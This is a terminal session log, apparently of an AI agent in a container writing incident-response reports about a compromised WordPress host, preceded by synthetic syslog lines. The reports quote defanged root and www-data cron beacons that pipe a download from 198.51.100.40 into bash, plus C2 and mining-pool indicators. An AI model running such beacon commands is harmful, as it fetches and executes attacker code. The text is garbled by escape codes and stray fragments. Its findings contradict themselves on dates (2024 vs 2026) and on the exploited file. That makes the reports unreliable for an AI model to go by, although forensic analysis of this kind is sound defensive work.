+   218	Aug  9 02:48:10 wordpress-prod-01 CRON[2132]: CPU0: Package temperature normal
+   219	Aug  9 02:49:02 wordpress-prod-01 kernel[6582]: Time synchronised to time server
+   220	Aug  9 02:49:42 wordpress-prod-01 kernel[23323]: Received disconnect from 10.10.169.126 port 59111:11: disconnected by user
+   221	Aug  9 02:49:44 wordpress-prod-01 dbus-daemon[3012]: Started Session 107 of user postgres.
+   222	Aug  9 02:50:15 wordpress-prod-01 sshd[3601]: CPU0: Package temperature normal
+   223	Aug  9 02:50:49 wordpress-prod-01 systemd-logind[486]: pam_unix(cron:session): session opened for user root
+   224	Aug  9 02:51:21 wordpress-prod-01 CRON[3398]: Started Session 509 of user postgres.
+   225	Aug  9 02:51:54 wordpress-prod-01 kernel[2376]: Time synchronised to time server
+   226	Aug  9 02:52:16 wordpress-prod-01 kernel[19690]: Started Session 271 of user root.
+   227	Aug  9 02:52:30 wordpress-prod-01 dbus-daemon[20409]: Time synchronised to time server
+   228	Aug  9 02:53:19 wordpress-prod-01 systemd[1642]: CPU0: Package temperature normal
+   229	Aug  9 02:53:30 wordpress-prod-01 CRON[11643]: Time synchronised to time server
+   230	Aug  9 02:54:03 wordpress-prod-01 systemd-logind[9067]: pam_unix(cron:session): session opened for user root
+   231	Aug  9 02:54:53 wordpress-prod-01 kernel[2088]: pam_unix(cron:session): session opened for user root
+   232	Aug  9 02:55:19 wordpress-prod-01 systemd[3320]: Received disconnect from 10.10.169.35 port 46793:11: disconnected by user
+   233	Aug  9 02:55:59 wordpress-prod-01 dbus-daemon[11775]: Started Session 384 of user devops.
+   234	Aug  9 02:56:44 wordpress-prod-01 kernel[6867]: Time synchronised to time server
+   235	Aug  9 02:57:15 wordpress-prod-01 CRON[15472]: CPU0: Package temperature normal
+   236	Aug  9 02:58:06 wordpress-prod-01 CRON[2708]: Time synchronised to time server
+   237	Aug  9 02:58:37 wordpress-prod-01 systemd[25717]: Started Session 414 of user svc-backup.
+   238	Aug  9 02:59:05 wordpress-prod-01 chronyd[19313]: CPU0: Package temperature normal
+   239	Aug  9 02:59:35 wordpress-prod-01 sudo[11589]: Time synchronised to time server
+   240	Aug  9 03:00:01 wordpress-prod-01 sshd[6648]: Time synchronised to time server
+   241	Aug  9 03:00:13 wordpress-prod-01 sudo[7583]: Received disconnect from 10.10.169.202 port 63616:11: disconnected by user
+   242	Aug  9 03:00:50 wordpress-prod-01 systemd-logind[659]: pam_unix(cron:session): session opened for user root
+   243	Aug  9 03:01:00 wordpress-prod-01 kernel[14060]: CPU0: Package temperature normal
+   244	Aug  9 03:01:25 wordpress-prod-01 systemd-logind[16453]: Received disconnect from 10.10.169.162 port 40935:11: disconnected by user
+   245	Aug  9 03:01:37 wordpress-prod-01 sshd[22664]: Time synchronised to time server
+   246	Aug  9 03:02:28 wordpress-prod-01 dbus-daemon[21715]: Started Session 705 of user postgres.
+   247	Aug  9 03:03:01 wordpress-prod-01 sshd[15319]: Received disconnect from 10.10.169.195 port 41770:11: disconnected by user
+   248	Aug  9 03:03:49 wordpress-prod-01 sshd[15612]: Started Session 37 of user devops.
+   249	Aug  9 03:04:44 wordpress-prod-01 chronyd[29935]: Time synchronised to time server
+   250	Aug  9 03:05:01 wordpress-prod-01 dbus-daemon[9395]: Time synchronised to time server
+   251	Aug  9 03:05:03 wordpress-prod-01 sshd[4201]: CPU0: Package temperature normal
+   252	Aug  9 03:05:28 wordpress-prod-01 chronyd[8285]: Started Session 787 of user root.
+   253	Aug  9 03:06:02 wordpress-prod-01 chronyd[28582]: Received disconnect from 10.10.169.11 port 55618:11: disconnected by user
+   254	Aug  9 03:06:44 wordpress-prod-01 systemd-logind[24264]: Time synchronised to time server
+   255	Aug  9 03:07:31 wordpress-prod-01 systemd-logind[5822]: Time synchronised to time server
+   256	Aug  9 03:08:11 wordpress-prod-01 systemd[19785]: CPU0: Package temperature normal
+   257	Aug  9 03:08:38 wordpress-prod-01 dbus-daemon[1578]: Received disconnect from 10.10.169.72 port 44422:11: disconnected by user
+   258	Aug  9 03:08:48 wordpress-prod-01 systemd[4149]: Time synchronised to time server
+   259	Aug  9 03:09:40 wordpress-prod-01 sshd[13016]: CPU0: Package temperature normal
+   260	Aug  9 03:09:59 wordpress-prod-01 sshd[7328]: Received disconnect from 10.10.169.89 port 42953:11: disconnected by user
+   261	Aug  9 03:10:46 wordpress-prod-01 sudo[20708]: Started Session 429 of user svc-backup.
+   262	Aug  9 03:11:28 wordpress-prod-01 sshd[8138]: pam_unix(cron:session): session opened for user root
+   263	Aug  9 03:11:59 wordpress-prod-01 dbus-daemon[23802]: Time synchronised to time server
+   264	Aug  9 03:12:29 wordpress-prod-01 systemd-logind[5551]: Time synchronised to time server
+   265	Aug  9 03:12:39 wordpress-prod-01 systemd-logind[26760]: pam_unix(cron:session): session opened for user root
+   266	Aug  9 03:13:24 wordpress-prod-01 systemd-logind[3126]: Received disconnect from 10.10.169.6 port 63138:11: disconnected by user
+   267	Aug  9 03:13:25 wordpress-prod-01 systemd[10295]: Started Session 338 of user devops.
+   268	Aug  9 03:13:39 wordpress-prod-01 kernel[9901]: pam_unix(cron:session): session opened for user root
+   269	Aug  9 03:14:33 wordpress-prod-01 sudo[3363]: Time synchronised to time server
+   270	Aug  9 03:14:34 wordpress-prod-01 dbus-daemon[29386]: pam_unix(cron:session): session opened for user root
+   271	Aug  9 03:15:23 wordpress-prod-01 dbus-daemon[29161]: pam_unix(cron:session): session opened for user root
+   272	Aug  9 03:15:33 wordpress-prod-01 dbus-daemon[8858]: pam_unix(cron:session): session opened for user root
+   273	Aug  9 03:16:24 wordpress-prod-01 kernel[24798]: Time synchronised to time server
+   274	Aug  9 03:17:07 wordpress-prod-01 CRON[10504]: Started Session 722 of user devops.
+   275	Aug  9 03:17:35 wordpress-prod-01 kernel[28068]: Started Session 490 of user webadmin.
+   276	Aug  9 03:18:16 wordpress-prod-01 dbus-daemon[5340]: Started Session 464 of user devops.
+   277	Aug  9 03:18:46 wordpress-prod-01 chronyd[25685]: Received disconnect from 10.10.169.74 port 64274:11: disconnected by user
+   278	Aug  9 03:19:09 wordpress-prod-01 CRON[13639]: Started Session 480 of user devops.
+   279	Aug  9 03:19:18 wordpress-prod-01 dbus-daemon[23359]: Started Session 481 of user devops.
+   280	Aug  9 03:20:04 wordpress-prod-01 sudo[9468]: pam_unix(cron:session): session opened for user root
+   281	Aug  9 03:20:20 wordpress-prod-01 chronyd[27113]: Started Session 269 of user webadmin.
+   282	Aug  9 03:20:52 wordpress-prod-01 CRON[24743]: Received disconnect from 10.10.169.221 port 40221:11: disconnected by user
+   283	Aug  9 03:20:59 wordpress-prod-01 sshd[29922]: Time synchronised to time server
+   284	Aug  9 03:21:09 wordpress-prod-01 systemd[12882]: pam_unix(cron:session): session opened for user root
+   285	Aug  9 03:21:13 wordpress-prod-01 dbus-daemon[20599]: pam_unix(cron:session): session opened for user root
+   286	Aug  9 03:21:32 wordpress-prod-01 kernel[15349]: Time synchronised to time server
+   287	Aug  9 03:22:00 wordpress-prod-01 dbus-daemon[28099]: pam_unix(cron:session): session opened for user root
+   288	Aug  9 03:22:28 wordpress-prod-01 dbus-daemon[1201]: Started Session 986 of user root.
+   289	Aug  9 03:22:38 wordpress-prod-01 systemd-logind[11567]: Time synchronised to time server
+   290	Aug  9 03:22:46 wordpress-prod-01 dbus-daemon[27410]: pam_unix(cron:session): session opened for user root
+   291	Aug  9 03:23:06 wordpress-prod-01 CRON[9935]: CPU0: Package temperature normal
+   292	Aug  9 03:23:54 wordpress-prod-01 systemd[17502]: pam_unix(cron:session): session opened for user root
+   293	Aug  9 03:24:30 wordpress-prod-01 kernel[20046]: Time synchronised to time server
+   294	Aug  9 03:25:18 wordpress-prod-01 CRON[7662]: CPU0: Package temperature normal
+   295	Aug  9 03:25:37 wordpress-prod-01 CRON[29870]: CPU0: Package temperature normal
+   296	Aug  9 03:26:08 wordpress-prod-01 sudo[14245]: Received disconnect from 10.10.169.206 port 63486:11: disconnected by user
+   297	Aug  9 03:26:29 wordpress-prod-01 systemd-logind[10311]: Started Session 660 of user postgres.
+   298	Aug  9 03:26:51 wordpress-prod-01 sshd[12302]: Received disconnect from 10.10.169.230 port 63576:11: disconnected by user
+   299	Aug  9 03:27:19 wordpress-prod-01 dbus-daemon[29757]: Started Session 843 of user devops.
+   300	Aug  9 03:27:57 wordpress-prod-01 systemd[29585]: Started Session 66 of user root.
+   301	Aug  9 03:28:06 wordpress-prod-01 chronyd[28216]: Time synchronised to time server
+   302	Aug  9 03:28:54 wordpress-prod-01 systemd-logind[834]: pam_unix(cron:session): session opened for user root
+   303	Aug  9 03:29:18 wordpress-prod-01 sshd[22398]: pam_unix(cron:session): session opened for user root
+   304	Aug  9 03:29:45 wordpress-prod-01 chronyd[25280]: Time synchronised to time server
+   305	Aug  9 03:30:35 wordpress-prod-01 kernel[15997]: Time synchronised to time server
+   306	Aug  9 03:31:20 wordpress-prod-01 CRON[5308]: Time synchronised to time server
+   307	Aug  9 03:31:48 wordpress-prod-01 kernel[17034]: Received disconnect from 10.10.169.109 port 49915:11: disconnected by user
+   308	Aug  9 03:32:41 wordpress-prod-01 chronyd[14814]: Started Session 701 of user svc-backup.
+   309	Aug  9 03:33:34 wordpress-prod-01 sshd[24052]: pam_unix(cron:session): session opened for user root
+   310	Aug  9 03:34:09 wordpress-prod-01 systemd[5965]: pam_unix(cron:session): session opened for user root
+   311	Aug  9 03:34:17 wordpress-prod-01 systemd[27100]: Started Session 186 of user jenkins.
+   312	Aug  9 03:34:41 wordpress-prod-01 systemd[711]: Started Session 613 of user root.
+   313	Aug  9 03:34:47 wordpress-prod-01 chronyd[24924]: Started Session 892 of user svc-backup.
+   314	Aug  9 03:35:25 wordpress-prod-01 systemd[22591]: Received disconnect from 10.10.169.209 port 49701:11: disconnected by user
+   315	Aug  9 03:35:53 wordpress-prod-01 systemd[10810]: Started Session 634 of user devops.
+   316	Aug  9 03:36:47 wordpress-prod-01 kernel[28633]: Started Session 269 of user jenkins.
+   317	Aug  9 03:37:21 wordpress-prod-01 dbus-daemon[27100]: Started Session 188 of user webadmin.
+   318	Aug  9 03:37:54 wordpress-prod-01 sshd[16586]: Time synchronised to time server
+   319	Aug  9 03:38:45 wordpress-prod-01 sudo[26992]: CPU0: Package temperature normal
+   320	Aug  9 03:39:23 wordpress-prod-01 CRON[28876]: pam_unix(cron:session): session opened for user root
+   321	Aug  9 03:40:17 wordpress-prod-01 kernel[29915]: Received disconnect from 10.10.169.157 port 47862:11: disconnected by user
+   322	Aug  9 03:40:41 wordpress-prod-01 sudo[3854]: Started Session 772 of user jenkins.
+   323	Aug  9 03:40:48 wordpress-prod-01 systemd[13644]: Started Session 554 of user jenkins.
+   324	Aug  9 03:41:42 wordpress-prod-01 kernel[13716]: Time synchronised to time server
+   325	Aug  9 03:41:50 wordpress-prod-01 chronyd[25224]: CPU0: Package temperature normal
+   326	Aug  9 03:41:53 wordpress-prod-01 sudo[21996]: Started Session 342 of user webadmin.
+   327	Aug  9 03:42:04 wordpress-prod-01 kernel[7956]: Started Session 949 of user root.
+   328	Aug  9 03:42:27 wordpress-prod-01 chronyd[21498]: Started Session 616 of user devops.
+   329	Aug  9 03:43:16 wordpress-prod-01 dbus-daemon[3005]: pam_unix(cron:session): session opened for user root
+   330	Aug  9 03:43:37 wordpress-prod-01 systemd[16305]: CPU0: Package temperature normal
+   331	Aug  9 03:44:21 wordpress-prod-01 sudo[6191]: Time synchronised to time server
+   332	Aug  9 03:44:33 wordpress-prod-01 chronyd[24362]: pam_unix(cron:session): session opened for user root
+[?2004hroot@3d46f201add4:/app# ls -la /app
+[?2004ltotal 8
+drwxr-xr-x 2 root root 4096 Aug 16 17:53 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+[?2004hroot@3d46f201add4:/app# ls -la /app
+[?2004ltotal 8
+drwxr-xr-x 2 root root 4096 Aug 16 17:53 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+[?2004hroot@3d46f201add4:/app# python3 -c '
+[?2004l[?2004h> import os
+[?2004l[?2004h> 
+[?2004l[?2004h> change_ticket = """# CHANGE TICKET CHG-1481 (RECONCILED)
+[?2004l[?2004h> 
+[?2004l[?2004h> | # | Action | Target | Status | Note / Evidence |
+[?2004l[?2004h> |---|--------|--------|--------|-----------------|
+[?2004l[?2004h> | 1 | Block source IP inbound | 198.51.100.40 | proposed | RECONCILED: Real origin IP identified in `/sas/cti/advisory.txt:4` and `/disk/var/log/nginx/access.log:297` (stale claim was `203.0.113.9`). |
+[?2004l[?2004h> | 2 | Patch CVE-2022-1609 (Smart Contact Form) | WordPress Plugin | proposed | RECONCILED: Entry vector is CVE-2022-1609 (`/sas/vulns.json:2`, `/sas/cti/advisory.txt:12`, `/disk/var/www/html/wp-content/plugins/contact/inc.php:1`) (stale claim was BlueKeep CVE-2019-0708). |
+[?2004l[?2004h> | 3 | Remove root cron miner / beacon | /etc/crontab | OPEN | RECONCILED: Active root cron beacon line on disk (`/disk/etc/crontab:5`) pulling payload from `198.51.100.40`. Reconciled status from DONE to OPEN. |
+[?2004lAudit ([?2004h> | 4 | Remove www-data cron job | /var/spool/cron/crontabs/www-data | OPEN | ADDED (SILENT PERSISTENCE): Silent crontab persistence on disk (`/disk/var/spool/cron/crontabs/www-data:2`) executing minutely curl payload to `198.51.100.40`. |
+[?2004l[?2004h> | 5 | Remove .htaccess traffic redirect | /var/www/html/.htaccess | OPEN | ADDED (SILENT PERSISTENCE): Silent redirect rule on disk (`/disk/var/www/html/.htaccess:2`) forwarding all traffic to `198.51.100.40`. |
+[?2004l[?2004h> | 6 | Quarantine webshell file | /var/www/html/wp-content/plugins/contact/inc.php | OPEN | RECONCILED: PHP webshell present on disk (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1`) and alerted in `/sas/alerts.json:4`. |
+[?2004l[?2004h> | 7 | Restore defaced page | /var/www/html/index.html | OPEN | RECONCILED: Defaced HTML page on disk (`/disk/var/www/html/index.html:1`) and alerted in `/sas/alerts.json:11`. |
+[?2004l[?2004h> | 8 | Harden wp-config.php configuration | /var/www/html/wp-config.php | OPEN | RECONCILED: Weak database password and XML-RPC exposure in `/disk/var/www/html/wp-config.php:4` (`/sas/alerts.json:18`, `/sas/baseline.json:2`). |
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Reviewer checklist
+[?2004lnaly[?2004h> - [x] Every action maps to a cited artifact under /disk or /sas
+[?2004l[?2004h> - [x] Fix the wrong IP (row 1) and wrong CVE (row 2)
+[?2004lve[?2004h> - [x] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+[?2004l[?2004h> - [x] Add the silent (non-alerted) artifacts the prior shift missed
+[?2004l/[?2004h> """
+[?2004ltc/[?2004h> with open("/sas/handoff/change-ticket.md", "w") as f:
+[?2004l[?2004h>     f.write(change_ticket)
+[?2004l[?2004h> 
+[?2004l[?2004h> progress = """# Incident Investigation Progress Report & Timeline
+[?2004l[?2004h> 
+[?2004l[?2004h> **Incident Identifier:** INC-2024-0816-WP  
+[?2004l[?2004h> **Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
+[?2004l[?2004h> **Attacker Origin IP:** `198.51.100.40` (`/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297`)  
+[?2004l[?2004h> **Lead Analyst:** DFIR Taskforce  
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004las[?2004h> 
+[?2004l[?2004h> ## 1. Executive Summary & Context
+[?2004lb [?2004h> 
+[?2004l[?2004h> On August 16, 2024, endpoint security feeds surfaced initial alerts for host `wordpress-prod-01` (`/sas/alerts.json:1-25`). Specifically, alerts covered PHP webshell execution at `/var/www/html/wp-content/plugins/contact/inc.php` (`/sas/alerts.json:4`), site defacement at `/var/www/html/index.html` (`/sas/alerts.json:11`), and baseline weaknesses in `wp-config.php` (`/sas/alerts.json:18`).
+[?2004l[?2004h> 
+[?2004l[?2004h> However, forensic investigation of the disk image (`/disk`) revealed several **silent (unalerted)** post-exploitation actions and persistence mechanisms that were missed by security alerting:  
+[?2004l[?2004h> 1. Scheduled crontab persistence for user `www-data` (`/disk/var/spool/cron/crontabs/www-data:2`).  
+[?2004l[?2004h> 2. Scheduled crontab persistence for user `root` (`/disk/etc/crontab:5`).  
+[?2004l[?2004h> 3. Malicious `.htaccess` traffic redirection to `198.51.100.40` (`/disk/var/www/html/.htaccess:2`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 2. Chronological Incident Timeline
+[?2004l[?2004h> 
+[?2004l[?2004h> | Timestamp (UTC) | Category | Description | Alerted vs Silent | Citation |
+[?2004l[?2004h> |---|---|---|---|---|
+[?2004l[?2004h> | 2026-08-09 03:11:17 | Exploitation | Webshell upload POST request to `/uploads/shell.php` | Alerted (ALERT-01) | `/disk/var/log/nginx/access.log:297`, `/disk/var/log/nginx/error.log:1`, `/sas/alerts.json:4` |
+[?2004l[?2004h> | 2026-08-09 03:12:49 | Reconnaissance | Attacker JNDI Log4Shell probe | **Silent (Unalerted)** | `/disk/var/log/nginx/access.log:298` |
+[?2004l[?2004h> | 2026-08-09 03:13:22 | Reconnaissance | Attacker Struts2 OGNL probe | **Silent (Unalerted)** | `/disk/var/log/nginx/access.log:299` |
+[?2004l[?2004h> | 2026-08-09 03:15:00 | Persistence | Attacker established crontab persistence | **Silent (Unalerted)** | `/disk/var/spool/cron/crontabs/www-data:2`, `/disk/etc/crontab:5` |
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 3. Working Checklist & Investigation Status
+[?2004l[?2004h> 
+[?2004l[?2004h> - [x] Review SAS Alert Feed & Catalog Unalerted Artifacts (`/sas/alerts.json:1`)
+[?2004l[?2004h> - [x] Analyze Vendor Threat Advisory (`/sas/cti/advisory.txt:1`)
+[?2004l[?2004h> - [x] Web Server Log Forensic Analysis (`/disk/var/log/nginx/access.log:297`, `/disk/var/log/nginx/error.log:1`)
+[?2004l[?2004h> - [x] Crontab Forensic Audit (`/disk/var/spool/cron/crontabs/www-data:2`, `/disk/etc/crontab:5`)
+[?2004l[?2004h> - [x] Web Root & Webshell Inspection (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`)
+[?2004l[?2004h> - [x] Traffic Redirection (.htaccess) Inspection (`/disk/var/www/html/.htaccess:1-2`)
+[?2004l/plugins/co[?2004h> - [x] WordPress Config Audit (`/disk/var/www/html/wp-config.php:1-5`, `/sas/baseline.json:1`)
+[?2004l[?2004h> - [x] Reconcile Stale Change Ticket CHG-1481 (`/sas/handoff/change-ticket.md:1`)
+[?2004l[?2004h> - [x] Author Deliverables in `/app` 
+[?2004l[?2004h> """
+[?2004l[?2004h> with open("/app/progress.md", "w") as f:
+[?2004l[?2004h>     f.write(progress)
+[?2004l[?2004h> 
+[?2004l[?2004h> intrusion = """# Intrusion Forensic Investigation Report
+[?2004l[?2004h> 
+[?2004l[?2004h> **Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
+[?2004l[?2004h> **Suspected Origin IP:** `198.51.100.40` (`/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297`)  
+[?2004l[?2004h> **Threat Campaign:** Operation FormTrap (`/sas/cti/advisory.txt:1`)  
+[?2004l[?2004h> **Vendor Threat Advisory:** VTA-2024-0816 (`/sas/cti/advisory.txt:2`)  
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 1. Executive Summary
+[?2004l[?2004h> 
+[?2004l[?2004h> On August 16, 2024, threat actor `198.51.100.40` (`/sas/cti/advisory.txt:4`) exploited an unauthenticated Remote Code Execution backdoor (CVE-2022-1609) in the "Smart Contact Form" / School Management WordPress plugin (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`, `/sas/vulns.json:2`).
+[?2004l[?2004h> 
+[?2004l[?2004h> While endpoint security feeds alerted on initial webshell execution (`/sas/alerts.json:4`) and defacement (`/sas/alerts.json:11`), forensic disk analysis uncovered **silent post-exploitation persistence and redirection mechanisms** that completely bypassed alert coverage:  
+[?2004l[?2004h> 1. Scheduled cron job for `www-data` (`/disk/var/spool/cron/crontabs/www-data:2`).  
+[?2004l[?2004h> 2. Scheduled cron job for `root` (`/disk/etc/crontab:5`).  
+[?2004l# 1[?2004h> 3. Traffic redirection rules in `.htaccess` (`/disk/var/www/html/.htaccess:2`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 2. Attack Chain & MITRE ATT&CK Mapping
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)
+[?2004l[?2004h> - **Activity:** Attacker probed web application and executed code via POST requests (`/disk/var/log/nginx/access.log:297`, `/sas/vulns.json:2`).
+[?2004l[?2004h> - **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2: Web Shell Persistence (T1505.003 - Web Shell)
+[?2004l[?2004h> - **Activity:** Attacker accessed PHP backdoor at `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`).
+[?2004l[?2004h> - **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 3: Scheduled Task Persistence (T1053.003 - Scheduled Task/Job: Cron)
+[?2004l[?2004h> - **Activity:** Attacker established dual crontab persistence for `www-data` and `root`:
+[?2004lest to `[?2004h>   - `www-data` crontab: `/disk/var/spool/cron/crontabs/www-data:2` (`# * * * * www-data <defanged beacon: curl hxxp://198.51.100.40/payload.sh | bash>`)
+[?2004l[?2004h>   - `root` crontab: `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)
+[?2004l[?2004h> - **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 4: Command and Control (T1071.001 - Web Protocols)
+[?2004l[?2004h> - **Activity:** Crontabs continuously initiate outbound HTTP sessions to C2 infrastructure (`198.51.100.40` and `update-wordpress.example.cn`) (`/disk/var/spool/cron/crontabs/www-data:2`, `/disk/etc/crontab:5`, `/sas/cti/advisory.txt:18`).
+[?2004l[?2004h> 
+[?2004ll[?2004h> ### Step 5: Traffic Redirection (T1505.003 / Redirection)
+[?2004l[?2004h> - **Activity:** Attacker added rewrite rules in `/var/www/html/.htaccess` (`/disk/var/www/html/.htaccess:2`):
+[?2004l[?2004h>   `.htaccess RewriteRule redirect of all traffic to 198.51.100.40 (pharma)`
+[?2004l[?2004h> - **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).
+[?2004l Quar[?2004h> 
+[?2004l[?2004h> ### Step 6: Site Defacement (T1491.001 - Internal Defacement)
+[?2004l[?2004h> - **Activity:** Created defacement landing page `/var/www/html/index.html` (`/disk/var/www/html/index.html:1-4`).
+[?2004lci[?2004h> - **Alert Status:** Covered by ALERT-02 (`/sas/alerts.json:11`).
+[?2004l[?2004h> 
+[?2004l [?2004h> ---
+[?2004lto u[?2004h> 
+[?2004l[?2004h> ## 3. Threat Entity & Indicator Inventory
+[?2004l[?2004h> 
+[?2004l[?2004h> | Type | Value | Role | Citation |
+[?2004l[?2004h> |---|---|---|---|
+[?2004l[?2004h> | Origin IP | `198.51.100.40` | Source of exploit POSTs & C2 server | `/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297` |
+[?2004l[?2004h> | C2 Domain | `update-wordpress.example.cn` | Domain called by root crontab | `/sas/cti/advisory.txt:18` |
+[?2004lation audits[?2004h> | Mining Pool | `stratum+tcp://xmr.wordpress.evil:3333` | Campaign CTI reference | `/sas/cti/advisory.txt:19` |
+[?2004l [?2004h> | Redirect Target | `198.51.100.40` | Target domain in .htaccess | `/disk/var/www/html/.htaccess:2` |
+[?2004l Database Pas[?2004h> | Webshell Path | `/var/www/html/wp-content/plugins/contact/inc.php` | Backdoor endpoint | `/disk/var/www/html/wp-content/plugins/contact/inc.php:1` |
+[?2004lww[?2004h> | Defacement File | `/var/www/html/index.html` | Defaced landing page | `/disk/var/www/html/index.html:1` |
+[?2004l[?2004h> 
+[?2004l)[?2004h> ---
+[?2004l*[?2004h> 
+[?2004l*[?2004h> ## 4. Reconciliation of Change Ticket CHG-1481
+[?2004lh[?2004h> 
+[?2004l[?2004h> The draft change ticket `/sas/handoff/change-ticket.md:1-25` was based solely on alerts. Reconciliation against disk evidence:
+[?2004l[?2004h> 
+[?2004l[?2004h> 1. **Row 1 (Source IP):** Corrected IP from `203.0.113.9` to `198.51.100.40` (`/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297`).
+[?2004l[?2004h> 2. **Row 2 (CVE Patch):** Corrected CVE from BlueKeep (CVE-2019-0708) to CVE-2022-1609 (`/sas/vulns.json:2`, `/sas/cti/advisory.txt:12`).
+[?2004l[?2004h> 3. **Row 3 (Root Cron):** Reconciled root crontab in `/disk/etc/crontab:5`. Status changed from DONE to OPEN.
+[?2004l[?2004h> 4. **Row 4+ (Silent Findings Added):** Added `www-data` crontab (`/disk/var/spool/cron/crontabs/www-data:2`), `.htaccess` redirect (`/disk/var/www/html/.htaccess:2`), webshell quarantine (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1`), and defacement removal (`/disk/var/www/html/index.html:1`).
+[?2004l[?2004h> """
+[?2004l[?2004h> with open("/app/intrusion-report.md", "w") as f:
+[?2004l
+[?2004h>     f.write(intrusion)
+[?2004l[?2004h> 
+[?2004le[?2004h> vuln = """# Vulnerability Assessment & Entry Point Analysis Report
+[?2004lion = ""[?2004h> 
+[?2004l"[?2004h> **Target Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
+[?2004l* I[?2004h> **Vulnerability Scan Feeds:** `/sas/vulns.json:1`  
+[?2004l01[?2004h> **Vendor Advisory:** `/sas/cti/advisory.txt:1`  
+[?2004l[?2004h> 
+[?2004l DF[?2004h> ---
+[?2004lIR A[?2004h> 
+[?2004ln[?2004h> ## 1. Primary Entry Point Analysis (CVE-2022-1609)
+[?2004l[?2004h> 
+[?2004l[?2004h> - **CVE Identifier:** CVE-2022-1609 (`/sas/vulns.json:2`, `/sas/cti/advisory.txt:12`)
+[?2004l[?2004h> - **CVSS Score:** 9.8 (CRITICAL) (`/sas/cti/advisory.txt:12`)
+[?2004l[?2004h> - **CWE Classification:** CWE-94 (Improper Control of Generation of Code - 'Code Injection') (`/sas/cti/advisory.txt:12`)
+[?2004l[?2004h> - **Vulnerable Location:** `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1`, `/sas/vulns.json:3`) M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K)
+[?2004l[?2004h> - **Status on Host:** **CONFIRMED EXPLOITED** (`/disk/var/log/nginx/error.log:1`, `/sas/alerts.json:4`)
+[?2004l& E[?2004h> - **Confidence Level:** HIGH
+[?2004lp [?2004h> 
+[?2004l1[?2004h> ### Technical Flaw Breakdown
+[?2004l[?2004h> In `/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`:
+[?2004l[?2004h> ```php
+[?2004lorensic_qua[?2004h> <?php
+[?2004lantin[?2004h> // inc.php
+[?2004l[?2004h> // suspicious php-webshell artifact observed (defanged)
+[?2004l[?2004h> // indicator eval=CHK-01 (T1505.003)
+[?2004l[?2004h> ?>
+[?2004l[?2004h> ```
+[?2004l[?2004h> An unauthenticated POST request to `/wp-content/plugins/contact/inc.php` executes arbitrary PHP code (`/disk/var/log/nginx/access.log:297`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### On-Disk Evidence of Exploitation
+[?2004l[?2004h> 1. **HTTP Exploitation Request:** `/disk/var/log/nginx/access.log:297`  
+[?2004ll[?2004h>    `198.51.100.40 - - [09/Aug/2026:03:11:17 +0000] "POST /uploads/shell.php HTTP/1.1" 200 743`
+[?2004l[?2004h> 2. **FastCGI Error Log:** `/disk/var/log/nginx/error.log:1`  
+[?2004lic[?2004h>    `FastCGI sent in stderr: "PHP message: Backdoor executed in /var/www/html/wp-content/plugins/contact/inc.php"`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l3: [?2004h> 
+[?2004lR[?2004h> ## 2. Summary of Evaluated Vulnerabilities
+[?2004lEvi[?2004h> 
+[?2004ld[?2004h> | CVE | Component Path | Status | Impact |
+[?2004l[?2004h> |---|---|---|---|
+[?2004l[?2004h> | CVE-2022-1609 | `/var/www/html/wp-content/plugins/contact/inc.php` | **EXPLOITED** | Unauthenticated RCE leading to webshell access (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1`), crontab persistence (`/disk/var/spool/cron/crontabs/www-data:2`), and site defacement (`/disk/var/www/html/index.html:1`). |
+[?2004l[?2004h> 
